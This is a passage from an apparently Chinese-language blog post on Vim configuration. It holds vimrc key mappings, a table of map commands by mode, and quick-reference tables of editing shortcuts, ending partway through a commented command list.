class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;LEADER&gt;</span><span class="symbol">&lt;CR&gt;</span> :<span class="keyword">nohlsearch</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 &lt;LEADER&gt;&lt;CR&gt; 映射为 :nohlsearch&lt;CR&gt; 用于快捷取消搜索高亮</span></span><br><span class="line"><span class="keyword">noremap</span> J <span class="number">5</span><span class="keyword">j</span></span><br><span class="line"><span class="keyword">noremap</span> K <span class="number">5</span><span class="keyword">k</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 复制到系统剪切板</span></span><br><span class="line"><span class="keyword">vnoremap</span> Y :<span class="keyword">w</span> !xclip -i -sel <span class="keyword">c</span> <span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 需要安装xclip  #sudo pacman -S xclip</span></span><br><span class="line"><span class="string">&quot;vnoremap Y &quot;</span>+<span class="keyword">y</span>		<span class="comment">&quot; 需要安装gvim   #sudo pacman -S gvim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> MR :<span class="keyword">e</span> $MYVIMRC<span class="symbol">&lt;CR&gt;</span>			<span class="comment">&quot; 打开vimrc</span></span><br><span class="line"><span class="keyword">map</span> s <span class="symbol">&lt;nop&gt;</span></span><br><span class="line"><span class="keyword">map</span> S :<span class="keyword">w</span><span class="symbol">&lt;CR&gt;</span>	<span class="string">&quot; 将 S 的指令映射为 :w&lt;CR&gt; 	 &quot;</span> <span class="symbol">&lt;CR&gt;</span> 代表回车</span><br><span class="line"><span class="keyword">map</span> Q :q<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 Q 的指令映射为 :q&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;silent&gt;</span> <span class="symbol">&lt;C-a&gt;</span> ggvG 	<span class="comment">&quot; Ctrl-A 选中所有内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sk :<span class="keyword">set</span> splitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="string">&quot; 下分屏&quot;</span>:<span class="keyword">e</span> /文件路径 打开文件</span><br><span class="line"><span class="keyword">map</span> sj :<span class="keyword">set</span> nosplitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 上分屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sl</span> :<span class="keyword">set</span> nosplitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 右分屏 </span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sh</span> :<span class="keyword">set</span> splitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 左分屏	</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sz <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>H 	<span class="comment">&quot; 竖向分屏换左右分屏</span></span><br><span class="line"><span class="keyword">map</span> ss <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>K		<span class="comment">&quot; 左右分屏换竖向分屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">k</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">k</span>	<span class="comment">&quot; 光标到上屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">j</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">j</span>	<span class="comment">&quot; 光标到下屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>h <span class="symbol">&lt;C-w&gt;</span>h	<span class="comment">&quot; 光标到左屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">l</span>	<span class="comment">&quot; 光标到右屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;up&gt;</span> :<span class="keyword">res</span> +<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线上移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;down&gt;</span> :<span class="keyword">res</span> -<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线下移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;left&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>+<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线左移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;right&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>-<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线右移</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tn</span> :<span class="keyword">tabe</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 打开新选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">th</span> :-<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到左边的选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tl</span> :+<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到右边的选项卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 符号自动补全</span></span><br><span class="line">:<span class="keyword">inoremap</span> ( ()<span class="symbol">&lt;ESC&gt;</span>i</span><br><span class="line">:<span class="keyword">inoremap</span> ) <span class="symbol">&lt;c-r&gt;</span>=ClosePair(<span class="string">&#x27;)&#x27;</span>)<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="comment">&quot;:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span></span><br><span class="line"><span class="comment">&quot;:inoremap &#125; &lt;c-r&gt;=ClosePair(&#x27;&#125;&#x27;)&lt;CR&gt;</span></span><br><span class="line">:<span class="keyword">inoremap</span> [ []<span class="symbol">&lt;ESC&gt;</span>i</span><br><span class="line">:<span class="keyword">inoremap</span> ] <span class="symbol">&lt;c-r&gt;</span>=ClosePair(<span class="string">&#x27;]&#x27;</span>)<span class="symbol">&lt;CR&gt;</span></span><br><span class="line">:<span class="keyword">inoremap</span> <span class="string">&quot; &quot;</span><span class="comment">&quot;&lt;ESC&gt;i</span></span><br><span class="line">:<span class="keyword">inoremap</span> <span class="string">&#x27; &#x27;</span><span class="string">&#x27;&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">	if getline(&#x27;</span>.<span class="string">&#x27;)[col(&#x27;</span>.<span class="string">&#x27;) - 1] == a:char</span></span><br><span class="line"><span class="string">		return &quot;\&lt;Right&gt;&quot;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">		return a:char</span></span><br><span class="line"><span class="string">	endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;=====END=====</span></span><br><span class="line"><span class="string">&quot;===键盘映射===</span></span><br><span class="line"><span class="string">&quot;=============</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Command 命令</th>
<th style="text-align:center">Normal   常规模式</th>
<th style="text-align:center">Visual 可视化模式</th>
<th style="text-align:center">Operator Pending 运算符模式</th>
<th style="text-align:center">Insert Only 插入模式</th>
<th style="text-align:center">Command Line 命令行模式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>:map</code></td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:map!</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center">y</td>
</tr>
<tr>
<td style="text-align:center"><code>:nmap</code></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:vmap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:omap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:imap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>:cmap</code></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">y</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim快捷键速查"><a href="#vim快捷键速查" class="headerlink" title="vim快捷键速查"></a>vim快捷键速查</h2><h4 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">从当前模式转换到“普通模式”。所有的键对应到命令。</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">“插入模式”用于插入文字。回归按键的本职工作。</td>
</tr>
<tr>
<td style="text-align:left"><code>:</code></td>
<td style="text-align:left">“命令行模式” Vim 希望你输入类似于保存该文档命令的地方。</td>
</tr>
</tbody>
</table>
</div>
<h4 id="方向键"><a href="#方向键" class="headerlink" title="方向键"></a>方向键</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h4 id="文档浏览"><a href="#文档浏览" class="headerlink" title="文档浏览"></a>文档浏览</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h4 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h4 id="搜索、替换"><a href="#搜索、替换" class="headerlink" title="搜索、替换"></a>搜索、替换</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h4 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h4 id="保存、退出"><a href="#保存、退出" class="headerlink" title="保存、退出"></a>保存、退出</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://linux.cn/article-8144-1.html">参考</a></p>
<h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;================</span></span><br><span class="line"><span class="comment">&quot;=====指令收集=====</span></span><br><span class="line"><span class="comment">&quot;======START=====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 系统时间</span></span><br><span class="line"><span class="string">&quot;  :map &lt;F7&gt; a&lt;C-R&gt;=strftime(&quot;</span>%<span class="keyword">c</span><span class="comment">&quot;)&lt;CR&gt;&lt;esc&gt;</span></span><br><span class="line"><span class="string">&quot;  :s/__date__/\=strftime(&quot;</span>%<span class="keyword">c</span><span class="comment">&quot;)/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;         基础命令</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   ctrl+q              可以联合复制，粘贴，替换用 行操作</span></span><br><span class="line"><span class="comment">&quot;   ctrl+w+j ctrl+w+k (:bn :bp :bd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   &#x27;.                  它移动光标到上一次的修改行</span></span><br><span class="line"><span class="comment">&quot;   `.                  它移动光标到上一次的修改点</span></span><br><span class="line"><span class="comment">&quot;   .                   重复上次命令</span></span><br><span class="line"><span class="comment">&quot;   &lt;C-O&gt; :             依次沿着你的跳转记录向回跳 (从最近的一次开始)</span></span><br><span class="line"><span class="comment">&quot;   &lt;C-I&gt; :             依次沿着你的跳转记录向前跳</span></span><br><span class="line"><span class="comment">&quot;   ju(mps) :           列出你跳转的足迹</span></span><br><span class="line"><span class="comment">&quot;   :history :          列出历史命令记录</span></span><br><span class="line"><span class="comment">&quot;   :his c :            命令行命令历史</span></span><br><span class="line"><span class="comment">&quot;   :his s :            搜索命令历史</span></span><br><span class="line"><span class="comment">&quot;   q/ :                搜索命令历史的窗口</span></span><br><span class="line"><span class="comment">&quot;   q: :                命令行命令历史的窗口</span></span><br><span class="line"><span class="comment">&quot;   g ctrl+g            计算文件字符</span></span><br><span class="line"><span class="comment">&quot;   &#123;,&#125;                 前进至上一段落前进至后一段落</span></span><br><span class="line"><span class="comment">&quot;   gg,G(2G)            文件首</span></span><br><span class="line"><span class="comment">&quot;   gd dw gf ga(进制转化)</span></span><br><span class="line"><span class="comment">&quot;   gg=G 全篇自动缩进 , =G 单行缩进</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;* ci[ 删除一对 [] 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci( 删除一对 () 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci&lt; 删除一对 &lt;&gt; 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci&#123; 删除一对 &#123;&#125; 中的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* cit 删除一对 HTML/XML 的标签内部的所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;* ci” ci’ ci` 删除一对引号字符 (” 或 ‘ 或 `) 中所有字符并进入插入模式</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;* vi[ 选择一对 [] 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi( 选择一对 () 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi&lt; 选择一对 &lt;&gt; 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi&#123; 选择一对 &#123;&#125; 中的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vit 选择一对 HTML/XML 的标签内部的所有字符</span></span><br><span class="line"><span class="comment">&quot;* vi” vi’ vi` 选择一对引号字符 (” 或 ‘ 或 `) 中所有字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   crl+] 函数原型处 crl+t 回 ( ctags )</span></span><br><span class="line"><span class="comment">&quot;   ctl+p 自动补全( 编辑状态 )</span></span><br><span class="line"><span class="comment">&quot;   :X 加密保存( 要输入密码 )</span></span><br><span class="line"><span class="comment">&quot;   ? /         (N n)</span></span><br><span class="line"><span class="comment">&quot;   f(F,t) 查找字符</span></span><br><span class="line"><span class="comment">&quot;   w(e) 移动光标到下一个单词.</span></span><br><span class="line"><span class="comment">&quot;   5fx 表示查找光标后第 5 个 x 字符.</span></span><br><span class="line"><span class="comment">&quot;   5w(e) 移动光标到下五个单词.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   b 移动光标到上一个单词.</span></span><br><span class="line"><span class="comment">&quot;   0 移动光标到本行最开头.</span></span><br><span class="line"><span class="comment">&quot;   ^ 移动光标到本行最开头的字符处.</span></span><br><span class="line"><span class="comment">&quot;   $ 移动光标到本行结尾处.</span></span><br><span class="line"><span class="comment">&quot;   H 移动光标到屏幕的首行.</span></span><br><span class="line"><span class="comment">&quot;   M 移动光标到屏幕的中间一行.</span></span><br><span class="line"><span class="comment">&quot;   L 移动光标到屏幕的尾行.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   c-f (即 ctrl 键与 f 键一同按下)</span></span><br><span class="line"><span class="comment">&quot;   c-b (即 ctrl 键与 b 键一同按下) 翻页</span></span><br><span class="line"><span class="comment">&quot;   c-d (下半页) c-u(上半页) c-e (一行滚动)</span></span><br><span class="line"><span class="comment">&quot;   zz 让光标所在的行居屏幕中央</span></span><br><span class="line"><span class="comment">&quot;   zt 让光标所在的行居屏幕最上一行</span></span><br><span class="line"><span class="comment">&quot;   zb 让光标所在的行居屏幕最下一行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   在 vi 中 y 表示拷贝, d 表示删除, p 表示粘贴. 其中拷贝与删除是与光标移动命令</span></span><br><span class="line"><span class="comment">&quot;   yw 表示拷贝从当前光标到光标所在单词结尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   dw 表示删除从当前光标到光标所在单词结尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   y0 表示拷贝从当前光标到光标所在行首的内容.</span></span><br><span class="line"><span class="comment">&quot;   d0 表示删除从当前光标到光标所在行首的内容.</span></span><br><span class="line"><span class="comment">&quot;   y$(Y) 表示拷贝从当前光标到光标所在行尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   d$(D) 表示删除从当前光标到光标所在行尾的内容.</span></span><br><span class="line"><span class="comment">&quot;   yfa 表示拷贝从当前光标到光标后面的第一个a字符之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   dfa 表示删除从当前光标到光标后面的第一个a字符之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   s(S),a(A),x(X),D</span></span><br><span class="line"><span class="comment">&quot;   yy 表示拷贝光标所在行.</span></span><br><span class="line"><span class="comment">&quot;   dd 表示删除光标所在行.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   5yy 表示拷贝光标以下 5 行.</span></span><br><span class="line"><span class="comment">&quot;   5dd 表示删除光标以下 5 行.</span></span><br><span class="line"><span class="comment">&quot;   y2fa 表示拷贝从当前光标到光标后面的第二个a字符之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   :12,24y 表示拷贝第12行到第24行之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   :12,y 表示拷贝第12行到光标所在行之间的内容.</span></span><br><span class="line"><span class="comment">&quot;   :,24y 表示拷贝光标所在行到第24行之间的内容. 删除类似.</span></span><br><span class="line"><span class="comment">&quot;   TAB 就是制表符, 单独拿出来做一节是因为这个东西确实很有用.</span></span><br><span class="line"><span class="comment">&quot;   &lt;&lt; 输入此命令则光标所在行向左移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   &gt;&gt; 输入此命令则光标所在行向右移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   5&gt;&gt; 输入此命令则光标后 5 行向右移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :5&gt;&gt;(&gt;&gt;&gt;) :&gt;&gt;(&gt;&gt;&gt;)5</span></span><br><span class="line"><span class="comment">&quot;   :12,24&gt; 此命令将12行到14行的数据都向右移动一个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :12,24&gt;&gt; 此命令将12行到14行的数据都向右移动两个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :set shiftwidth=4 设置自动缩进 4 个空格, 当然要设自动缩进先.</span></span><br><span class="line"><span class="comment">&quot;   :set sts=4 即设置 softtabstop 